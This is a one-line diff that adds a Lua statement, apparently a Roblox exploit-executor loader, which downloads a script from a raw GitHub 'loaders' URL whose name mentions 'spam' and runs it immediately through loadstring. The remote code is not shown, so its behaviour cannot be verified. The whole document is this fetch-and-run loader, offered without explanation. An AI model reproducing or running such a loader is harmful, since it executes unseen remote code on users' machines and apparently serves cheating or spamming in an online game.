@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/runaways-beta-spam0-1mokxm93jng0yl.lua"))()
